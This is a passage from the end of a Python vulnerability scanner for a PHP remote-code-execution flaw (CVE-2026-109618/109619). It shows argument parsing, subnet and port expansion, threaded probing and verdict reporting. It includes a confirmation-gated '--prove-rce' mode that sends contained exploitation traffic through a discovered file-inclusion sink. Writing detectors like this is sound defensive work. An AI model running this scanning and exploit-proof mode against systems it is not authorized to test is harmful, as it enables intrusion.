                out["processes"].append(line.strip()[:160])
    except Exception as e:
        out["notes"].append(f"ps failed: {e}")
    if not out["binaries"]:
        out["notes"].append("no php binary found in PATH or common locations")
    return out


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(
        description="php2shell scanner (CVE-2026-109618/109619) — non-destructive detector. "
                    "Default: check HTTP(80)+HTTPS(443). Scanning only hosts you own / are authorized to test.")
    ap.add_argument("target", nargs="?", help="IP or hostname (may include scheme, e.g. https://host)")
    ap.add_argument("-f", "--targets-file", help="file with one target per line")
    ap.add_argument("-s", "--subnet", help="CIDR to enumerate, e.g. 192.168.1.0/24")
    ap.add_argument("-p", "--ports", help="explicit ports, e.g. 80,443,8080 or 8000-8010")
    ap.add_argument("--discover-ports", action="store_true", help="probe common web ports first, scan open ones")
    ap.add_argument("--no-oracle", action="store_true", help="skip active oracle probe (version fingerprint only)")
    ap.add_argument("--phpinfo", action="store_true", help="also probe common phpinfo paths for version disclosure")
    ap.add_argument("--reverse-dns", action="store_true", help="PTR lookup for each target IP")
    ap.add_argument("--local", action="store_true",
                    help="on-box enumeration: list local php binaries/versions/SAPIs/processes (run ON the host)")
    ap.add_argument("--timeout", type=float, default=8.0, help="per-request ceiling in seconds (default 8)")
    ap.add_argument("--threads", type=int, default=16, help="scan concurrency (default 16)")
    ap.add_argument("--connect-timeout", type=float, default=3.0,
                    help="TCP pre-check ceiling in seconds (default 3; dead hosts fail here fast)")
    ap.add_argument("--host-budget", type=float, default=120.0,
                    help="wall-clock cap per host:port in seconds (default 120; slow hosts are cut off with partial findings)")
    ap.add_argument("--progress", action="store_true", help="per-completion progress lines to stderr (useful for subnets)")
    ap.add_argument("--spider-pages", type=int, default=10,
                    help="max pages the site spider fetches per endpoint (default 10; 0 disables crawl, single-page harvest only)")
    ap.add_argument("--spider-depth", type=int, default=2,
                    help="max crawl depth from / (default 2). Aggressive: --spider-pages 50 --spider-depth 4")
    ap.add_argument("--insecure", action="store_true", help="skip TLS verification (labs/self-signed)")
    ap.add_argument("-v", "--verbose", action="count", default=0,
                    help="trace to stderr: -v per-phase lines (fingerprint/spider/discover/oracle/verdict), "
                         "-vv adds every request (method+path+status+ms)")
    ap.add_argument("--trace-file", help="also append trace lines to FILE (same content as stderr)")
    ap.add_argument("--prove-rce", action="store_true",
                    help="AUTHORIZED ONLY: contained Chain-A marker-write through an AUTO-DISCOVERED "
                         "LFI sink (no shell, cleanup enforced). Requires double confirmation: "
                         "P2S_RCE_ARM=1 in env AND typed target echo on a TTY. Refuses otherwise.")
    ap.add_argument("--json", action="store_true", help="JSON output")
    ap.add_argument("-o", "--output", help="write results (JSON) to file")
    ap.add_argument("--version", action="store_true", help="print version and exit")
    args = ap.parse_args(argv)
    global _TRACE_LEVEL, _trace_fh
    _TRACE_LEVEL = min(args.verbose, 2)
    _trace_fh = None
    if args.trace_file:
        _trace_fh = open(args.trace_file, "a", encoding="utf-8")
    if args.version:
        print(f"php2shell-scanner {TOOL_VERSION}")
        return 0
    if args.local:
        data = run_local_enum()
        if args.output:
            with open(args.output, "w", encoding="utf-8") as fh:
                json.dump(data, fh, indent=2)
        if args.json:
            print(json.dumps(data, indent=2))
        else:
            for b in data["binaries"]:
                v = b.get("version", "?")
                say(f"[{b.get('verdict', '?')}] {b['path']} PHP {v} "
                    f"(sapi={b.get('sapi', '?')}, expose_php={b.get('expose_php', '?')}, "
                    f"errors={b.get('display_errors', '?')}, progress={b.get('upload_progress', '?')})")
                if b.get("detail"):
                    say(f"    {b['detail']}")
            for p in data["processes"][:20]:
                say(f"  proc: {p}")
            for n in data["notes"]:
                say(f"  note: {n}")
        n_bad = sum(1 for b in data["binaries"] if b.get("verdict") == "LIKELY_VULNERABLE")
        return 2 if n_bad else 0
    hosts = expand_targets(args)
    if not hosts:
        ap.error("no target: give TARGET, --targets-file, or --subnet")
    prove_rce = bool(args.prove_rce)
    if prove_rce:
        if os.environ.get("P2S_RCE_ARM") != "1":
            ap.error("--prove-rce requires P2S_RCE_ARM=1 in the environment (confirmation 1/2)")
        if not sys.stdin.isatty():
            ap.error("--prove-rce needs an interactive terminal for typed confirmation (confirmation 2/2)")
        confirm_targets = sorted(set(hosts))
        print(f"You are about to send CONTAINED EXPLOITATION TRAFFIC (Chain-A marker-write + cleanup) to: "
              f"{', '.join(confirm_targets)}.", file=sys.stderr)
        print("This must be systems you own or are explicitly authorized to test.", file=sys.stderr)
        try:
            answer = input(f"Type EXACTLY [{', '.join(confirm_targets)}] to proceed: ").strip()
        except (EOFError, KeyboardInterrupt):
            print("Aborted.", file=sys.stderr)
            return 1
        if answer != ", ".join(confirm_targets):
            print(f"REFUSED: typed {answer!r} does not match. Aborted.", file=sys.stderr)
            return 1
    ports = expand_ports(args)
    do_oracle = not args.no_oracle
    opener = make_opener(args.timeout, args.insecure)

    # Timeout rules (documented in README "Timeout rules"):
    #  - `--timeout S` (default 8): per-REQUEST ceiling (connect+read).
    #  - `--connect-timeout S` (default 3): TCP pre-check ceiling. Dead hosts
    #    fail here in ~3s instead of eating full HTTP+TLS timeouts per scheme.
    #  - `--host-budget S` (default 120): wall-clock cap per host:port. A
    #    slow-but-alive host can never hold a thread past this; remaining
    #    phases are skipped and the finding records what completed.
    #  - Pre-check ALWAYS runs (fast TCP open, both default and subnet paths):
    #    closed/filtered ports become instant UNREACHABLE without HTTP.
    #  - `--progress` prints per-completion lines to stderr (useful for /24s).
    jobs: list[tuple[str, int]] = []
    connect_timeout = max(0.5, min(args.connect_timeout, args.timeout))
    trace(1, f"pre-check: TCP open on {len(hosts)} host(s) x {len(ports)} port(s) "
              f"(connect-timeout={connect_timeout}s, threads={args.threads})")
    def probe(hp):
        h, pt = hp
        return (h, pt) if tcp_open(h, pt, connect_timeout) else None
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as ex:
        cands = [(h, p) for h in hosts for p in ports]
        if args.progress:
            trace(0, f"[*] pre-checking {len(cands)} endpoint(s) (TCP)...")
        for r in ex.map(probe, cands):
            if r:
                jobs.append(r)
    skipped = len(hosts) * len(ports) - len(jobs)
    if skipped:
        trace(1, f"pre-check: {skipped} closed/filtered endpoint(s) skipped, "
                  f"{len(jobs)} open")
        if args.progress:
            trace(0, f"[*] {skipped} closed/filtered, {len(jobs)} open — scanning...")
    if args.discover_ports and not jobs:
        say("port discovery: no open web ports found")
    if not jobs:
        # every endpoint closed: still emit UNREACHABLE findings so output
        # shape is stable (one row per host:port), then fall through.
        findings_pre: list[Finding] = []
        for h, p in [(h, p) for h in hosts for p in ports]:
            f = Finding(target=f"{h}:{p}", host=h, port=p, scheme="?", url="")
            f.detail = (f"TCP pre-check: port {p} closed/filtered "
                        f"(connect-timeout={connect_timeout}s)")
            findings_pre.append(decide(f))
    else:
        findings_pre = []

    findings: list[Finding] = list(findings_pre)
    spider_pages = max(0, args.spider_pages)
    spider_depth = max(0, args.spider_depth)
    host_budget = max(5.0, args.host_budget)
    t_start = __import__("time").monotonic()
    done_n = 0
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as ex:
        futs = {ex.submit(scan_endpoint, h, p, args.timeout, args.insecure,
                          do_oracle, args.phpinfo, args.reverse_dns, opener,
                          spider_pages, spider_depth, prove_rce, host_budget): (h, p)
                for h, p in jobs}
        for fut in concurrent.futures.as_completed(futs):
            try:
                findings.extend(fut.result())
            except Exception as e:
                h, p = futs[fut]
                f = Finding(target=f"{h}:{p}", host=h, port=p, scheme="?", url="")
                f.detail = f"scan error: {e}"
                findings.append(f)
            done_n += 1
            if args.progress:
                el = __import__("time").monotonic() - t_start
                trace(0, f"[*] {done_n}/{len(jobs)} endpoints ({el:.0f}s elapsed)...")

    data = [asdict(f) for f in findings]
    if args.output:
        with open(args.output, "w", encoding="utf-8") as fh:
            json.dump({"tool": f"php2shell-scanner/{TOOL_VERSION}", "cves": list(CVES),
                       "results": data}, fh, indent=2)
    if args.json:
        print(json.dumps(data, indent=2))
    else:
        order = {"RCE-PROVEN": -1, "VULNERABLE": 0, "LIKELY_VULNERABLE": 1, "PHP_NO_VERSION": 2,
                 "PHP_CANNOT_RULE_OUT": 2, "PHP_UNKNOWN": 3, "PATCHED": 4,
                 "TLS_UNTRUSTED": 5, "NO_PHP_SIGNAL": 6, "UNREACHABLE": 7}
        for f in sorted(findings, key=lambda x: (order.get(x.verdict, 9), x.host, x.port)):
            extra = f" PHP {f.php_version} ({f.version_source})" if f.php_version else ""
            ptr = f" [{f.reverse_dns}]" if f.reverse_dns else ""
            say(f"[{f.verdict}] {f.scheme}://{f.host}:{f.port}{extra}{ptr} :: {f.detail}")
        n_v = sum(1 for f in findings if f.verdict == "VULNERABLE")
        n_l = sum(1 for f in findings if f.verdict == "LIKELY_VULNERABLE")
        say(f"--- {len(findings)} endpoint(s): {n_v} VULNERABLE(oracle), {n_l} LIKELY_VULNERABLE(version) ---")
        say_recap(findings)
    return 0 if not any(f.verdict in ("VULNERABLE", "LIKELY_VULNERABLE", "RCE-PROVEN") for f in findings) else 2


if __name__ == "__main__":
    sys.exit(main())
